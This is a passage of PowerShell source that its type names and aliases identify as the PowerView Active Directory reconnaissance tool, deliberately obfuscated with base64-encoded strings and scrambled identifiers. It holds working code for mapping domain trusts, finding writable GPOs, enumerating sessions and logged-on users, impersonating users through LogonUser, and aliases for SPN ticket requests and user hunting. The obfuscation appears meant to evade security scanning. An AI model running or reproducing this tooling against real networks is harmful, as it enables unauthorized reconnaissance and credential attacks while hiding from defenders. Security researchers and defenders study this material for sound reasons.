    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
        ${__/\_/=\_/\____/=} = (__/\/\__/=\/\/\/\/ -Credential $Credential).Name
    }
    else {
        ${__/\_/=\_/\____/=} = (__/\/\__/=\/\/\/\/).Name
    }
    ${/\____/\__/\/=\_/}.Push(${__/\_/=\_/\____/=})
    while(${/\____/\__/\/=\_/}.Count -ne 0) {
        $Domain = ${/\____/\__/\/=\_/}.Pop()
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not ${___/\_/====\/\_/=}.ContainsKey($Domain))) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIAB0AHIAdQBzAHQAcwAgAGYAbwByACAAZABvAG0AYQBpAG4AOgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
            $Null = ${___/\_/====\/\_/=}.Add($Domain, '')
            try {
                ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
                ${/=\_/===\/\/\/\_/} = _/=\/==\/\_/=\____ @/=\/\__/\_/\_/=\_
                if (${/=\_/===\/\/\/\_/} -isnot [System.Array]) {
                    ${/=\_/===\/\/\/\_/} = @(${/=\_/===\/\/\/\_/})
                }
                if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
                    ${__/\_/=\_/==\__/=} = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${__/\_/=\_/==\__/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/\_/=\_/==\__/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${/=\_/===\/\/\/\_/} += _______/\/\/\_/\/\ @__/\_/=\_/==\__/=
                }
                if (${/=\_/===\/\/\/\_/}) {
                    if (${/=\_/===\/\/\/\_/} -isnot [System.Array]) {
                        ${/=\_/===\/\/\/\_/} = @(${/=\_/===\/\/\/\_/})
                    }
                    ForEach (${/==\/=\_/\/===\_/} in ${/=\_/===\/\/\/\_/}) {
                        if (${/==\/=\_/\/===\_/}.SourceName -and ${/==\/=\_/\/===\_/}.TargetName) {
                            $Null = ${/\____/\__/\/=\_/}.Push(${/==\/=\_/\/===\_/}.TargetName)
                            ${/==\/=\_/\/===\_/}
                        }
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
            }
        }
    }
}
function Get-GPODelegation {
    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    ${/===\__/=\__/===\} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBZAFMAVABFAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABBAGQAbQBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEEAZABtAGkAbgBzAA=='))))
    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    ${_/\_____/\_/\__/=} = @($Forest.Domains)
    ${/\____/\__/\/=\_/} = ${_/\_____/\_/\__/=} | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in ${/\____/\__/\/=\_/}) {
        $Filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAEcAUABPAE4AYQBtAGUAKQApAA==')))
        ${/=\/=\/=\__/\___/} = New-Object System.DirectoryServices.DirectorySearcher
        ${/=\/=\/=\__/\___/}.SearchRoot = $Domain
        ${/=\/=\/=\__/\___/}.Filter = $Filter
        ${/=\/=\/=\__/\___/}.PageSize = $PageSize
        ${/=\/=\/=\__/\___/}.SearchScope = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAdAByAGUAZQA=')))
        ${/===\_/=\_/=\/\/=} = ${/=\/=\/=\__/\___/}.FindAll()
        foreach (${__/\_/\/==\/\__/=} in ${/===\_/=\_/=\/\/=}){
            ${/=\____/=\_/\/=\_} = ([ADSI]${__/\_/\/==\/\__/=}.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA=='))) -and $_.AccessControlType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA=='))) -and  ${/===\__/=\__/===\} -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAE8AUgAgAE8AVwBOAEUAUgA=')))}
        if (${/=\____/=\_/\/=\_} -ne $null){
            ${/=\_/\/\_/\_/=\/=} = New-Object psobject
            ${/=\_/\/\_/\_/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAFMAUABhAHQAaAA='))) ${__/\_/\/==\/\__/=}.Properties.adspath
            ${/=\_/\/\_/\_/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${__/\_/\/==\/\__/=}.Properties.displayname
            ${/=\_/\/\_/\_/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) ${/=\____/=\_/\/=\_}.IdentityReference
            ${/=\_/\/\_/\_/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) ${/=\____/=\_/\/=\_}.ActiveDirectoryRights
            ${/=\_/\/\_/\_/=\/=}
        }
        }
    }
}
${/=\/\_/\___/=\_/=} = ___/==\_/==\_/\_/\ -_/===\____/=\/\___ Win32
${/=\_/==\/====\_/=} = __/\_/\/=\_/\/=\/\ ${/=\/\_/\___/=\_/=} PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMAA=')))
    GROUP_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_GROUP_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMQA=')))
    ALIAS_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_ALIAS_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMQA=')))
    USER_OBJECT                     =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMAA=')))
    MACHINE_ACCOUNT                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMQA=')))
    TRUST_ACCOUNT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMgA=')))
    APP_BASIC_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA=')))
    APP_QUERY_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMQA=')))
    ACCOUNT_TYPE_MAX                =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADcAZgBmAGYAZgBmAGYAZgA=')))
}
${_/\_____/=\/\_/\/} = __/\_/\/=\_/\/=\/\ ${/=\/\_/\___/=\_/=} PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA=')))
    GLOBAL_SCOPE                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA=')))
    DOMAIN_LOCAL_SCOPE              =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA=')))
    UNIVERSAL_SCOPE                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA=')))
    APP_BASIC                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA=')))
    APP_QUERY                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA=')))
    SECURITY                        =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA=')))
} -_/=\/\/\/=\/\___/\
${/=\____/\/===\/\_} = __/\_/\/=\_/\/=\/\ ${/=\/\_/\___/=\_/=} PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -_/=\/\/\/=\/\___/\
${_/=====\_/\__/\/=} = __/\_/\/=\_/\/=\/\ ${/=\/\_/\___/=\_/=} WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
${_/\/\__/\__/\/\__} = ____/\__/\/=\___/\ ${/=\/\_/\___/=\_/=} PowerView.RDPSessionInfo @{
    ExecEnvId = _____/===\_/=\/\_/ 0 UInt32
    State = _____/===\_/=\/\_/ 1 ${_/=====\_/\__/\/=}
    SessionId = _____/===\_/=\/\_/ 2 UInt32
    pSessionName = _____/===\_/=\/\_/ 3 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pHostName = _____/===\_/=\/\_/ 4 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pUserName = _____/===\_/=\/\_/ 5 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pDomainName = _____/===\_/=\/\_/ 6 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pFarmName = _____/===\_/=\/\_/ 7 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${_____/\/===\/\_/\} = ____/\__/\/=\___/\ ${/=\/\_/\___/=\_/=} WTS_CLIENT_ADDRESS @{
    AddressFamily = _____/===\_/=\/\_/ 0 UInt32
    Address = _____/===\_/=\/\_/ 1 Byte[] -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
${__/==\__/==\/==\_} = ____/\__/\/=\___/\ ${/=\/\_/\___/=\_/=} PowerView.ShareInfo @{
    Name = _____/===\_/=\/\_/ 0 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Type = _____/===\_/=\/\_/ 1 UInt32
    Remark = _____/===\_/=\/\_/ 2 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${__/\_/\/\___/==\/} = ____/\__/\/=\___/\ ${/=\/\_/\___/=\_/=} PowerView.LoggedOnUserInfo @{
    UserName = _____/===\_/=\/\_/ 0 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonDomain = _____/===\_/=\/\_/ 1 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    AuthDomains = _____/===\_/=\/\_/ 2 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonServer = _____/===\_/=\/\_/ 3 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${_/\/\/\_/\__/==\_} = ____/\__/\/=\___/\ ${/=\/\_/\___/=\_/=} PowerView.SessionInfo @{
    CName = _____/===\_/=\/\_/ 0 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    UserName = _____/===\_/=\/\_/ 1 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Time = _____/===\_/=\/\_/ 2 UInt32
    IdleTime = _____/===\_/=\/\_/ 3 UInt32
}
${___/\/=\/\_/=\__/} = __/\_/\/=\_/\/=\/\ ${/=\/\_/\___/=\_/=} SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
${/=\/===\____/=\_/} = ____/\__/\/=\___/\ ${/=\/\_/\___/=\_/=} LOCALGROUP_INFO_1 @{
    lgrpi1_name = _____/===\_/=\/\_/ 0 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lgrpi1_comment = _____/===\_/=\/\_/ 1 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${/==\/\/===\_/==\_} = ____/\__/\/=\___/\ ${/=\/\_/\___/=\_/=} LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = _____/===\_/=\/\_/ 0 IntPtr
    lgrmi2_sidusage = _____/===\_/=\/\_/ 1 ${___/\/=\/\_/=\__/}
    lgrmi2_domainandname = _____/===\_/=\/\_/ 2 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${_/=\__/=\____/\__} = __/\_/\/=\_/\/=\/\ ${/=\/\_/\___/=\_/=} DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -_/=\/\/\/=\/\___/\
${______/\/======\/} = __/\_/\/=\_/\/=\/\ ${/=\/\_/\___/=\_/=} DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
${/===\/\__/\____/=} = __/\_/\/=\_/\/=\/\ ${/=\/\_/\___/=\_/=} DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
${/===\/=\/\__/\_/\} = ____/\__/\/=\___/\ ${/=\/\_/\___/=\_/=} DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = _____/===\_/=\/\_/ 0 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    DnsDomainName = _____/===\_/=\/\_/ 1 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Flags = _____/===\_/=\/\_/ 2 ${_/=\__/=\____/\__}
    ParentIndex = _____/===\_/=\/\_/ 3 UInt32
    TrustType = _____/===\_/=\/\_/ 4 ${______/\/======\/}
    TrustAttributes = _____/===\_/=\/\_/ 5 ${/===\/\__/\____/=}
    DomainSid = _____/===\_/=\/\_/ 6 IntPtr
    DomainGuid = _____/===\_/=\/\_/ 7 Guid
}
${______/\_/\_/\/\/} = ____/\__/\/=\___/\ ${/=\/\_/\___/=\_/=} NETRESOURCEW @{
    dwScope =         _____/===\_/=\/\_/ 0 UInt32
    dwType =          _____/===\_/=\/\_/ 1 UInt32
    dwDisplayType =   _____/===\_/=\/\_/ 2 UInt32
    dwUsage =         _____/===\_/=\/\_/ 3 UInt32
    lpLocalName =     _____/===\_/=\/\_/ 4 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpRemoteName =    _____/===\_/=\/\_/ 5 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpComment =       _____/===\_/=\/\_/ 6 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpProvider =      _____/===\_/=\/\_/ 7 String -__/\/=\__/\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${_/==\_/\_/\/\/=\/} = @(
    (_____/=\/=\___/\/= netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (_____/=\/=\___/\/= netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (_____/=\/=\___/\/= netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (_____/=\/=\___/\/= netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (_____/=\/=\___/\/= netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (_____/=\/=\___/\/= netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (_____/=\/=\___/\/= netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (_____/=\/=\___/\/= netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (_____/=\/=\___/\/= advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -__/\___/\__/\_/=\/),
    (_____/=\/=\___/\/= advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -__/\___/\__/\_/=\/),
    (_____/=\/=\___/\/= advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (_____/=\/=\___/\/= advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -__/\___/\__/\_/=\/),
    (_____/=\/=\___/\/= advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -__/\___/\__/\_/=\/),
    (_____/=\/=\___/\/= advapi32 RevertToSelf ([Bool]) @() -__/\___/\__/\_/=\/),
    (_____/=\/=\___/\/= wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (_____/=\/=\___/\/= wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -__/\___/\__/\_/=\/),
    (_____/=\/=\___/\/= wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -__/\___/\__/\_/=\/),
    (_____/=\/=\___/\/= wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (_____/=\/=\___/\/= wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (_____/=\/=\___/\/= wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (_____/=\/=\___/\/= Mpr WNetAddConnection2W ([Int]) @(${______/\_/\_/\/\/}, [String], [String], [UInt32])),
    (_____/=\/=\___/\/= Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (_____/=\/=\___/\/= kernel32 CloseHandle ([Bool]) @([IntPtr]) -__/\___/\__/\_/=\/)
)
${_____/=\_/=\/====} = ${_/==\_/\_/\/\/=\/} | __/====\_/\_/\_/\/ -_/====\_/=\_/=\/\_ ${/=\/\_/\___/=\_/=} -_/=======\_/=\__/= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
${_/=\___/=\/\/\/==} = ${_____/=\_/=\/====}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAYQBwAGkAMwAyAA==')))]
${/=\____/===\/=\_/} = ${_____/=\_/=\/====}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAA==')))]
${___/\/\/\_/\_/\_/} = ${_____/=\_/=\/====}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwB0AHMAYQBwAGkAMwAyAA==')))]
${/====\/\__/=\/=\/} = ${_____/=\_/=\/====}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBwAHIA')))]
${_/\/=====\__/\__/} = ${_____/=\_/=\/====}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAA==')))]
sal Get-IPAddress Resolve-IPAddress
sal Convert-NameToSid ConvertTo-SID
sal Convert-SidToName ConvertFrom-SID
sal Request-SPNTicket Get-DomainSPNTicket
sal Get-DNSZone Get-DomainDNSZone
sal Get-DNSRecord Get-DomainDNSRecord
sal Get-NetDomain Get-Domain
sal Get-NetDomainController Get-DomainController
sal Get-NetForest Get-Forest
sal Get-NetForestDomain Get-ForestDomain
sal Get-NetForestCatalog Get-ForestGlobalCatalog
sal Get-NetUser Get-DomainUser
sal Get-UserEvent Get-DomainUserEvent
sal Get-NetComputer Get-DomainComputer
sal Get-ADObject Get-DomainObject
sal Set-ADObject Set-DomainObject
sal Get-ObjectAcl Get-DomainObjectAcl
sal Add-ObjectAcl Add-DomainObjectAcl
sal Invoke-ACLScanner Find-InterestingDomainAcl
sal Get-GUIDMap Get-DomainGUIDMap
sal Get-NetOU Get-DomainOU
sal Get-NetSite Get-DomainSite
sal Get-NetSubnet Get-DomainSubnet
sal Get-NetGroup Get-DomainGroup
sal Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
sal Get-NetGroupMember Get-DomainGroupMember
sal Get-NetFileServer Get-DomainFileServer
sal Get-DFSshare Get-DomainDFSShare
sal Get-NetGPO Get-DomainGPO
sal Get-NetGPOGroup Get-DomainGPOLocalGroup
sal Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
sal Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
sal Get-LoggedOnLocal Get-RegLoggedOn
sal Invoke-CheckLocalAdminAccess Test-AdminAccess
sal Get-SiteName Get-NetComputerSiteName
sal Get-Proxy Get-WMIRegProxy
sal Get-LastLoggedOn Get-WMIRegLastLoggedOn
sal Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
sal Get-RegistryMountedDrive Get-WMIRegMountedDrive
sal Get-NetProcess Get-WMIProcess
sal Invoke-ThreadedFunction New-ThreadedFunction
sal Invoke-UserHunter Find-DomainUserLocation
sal Invoke-ProcessHunter Find-DomainProcess
sal Invoke-EventHunter Find-DomainUserEvent
sal Invoke-ShareFinder Find-DomainShare
sal Invoke-FileFinder Find-InterestingDomainShareFile
sal Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
sal Get-NetDomainTrust Get-DomainTrust
sal Get-NetForestTrust Get-ForestTrust
sal Find-ForeignUser Get-DomainForeignUser
sal Find-ForeignGroup Get-DomainForeignGroupMember
sal Invoke-MapDomainTrust Get-DomainTrustMapping
sal Get-DomainPolicy Get-DomainPolicyData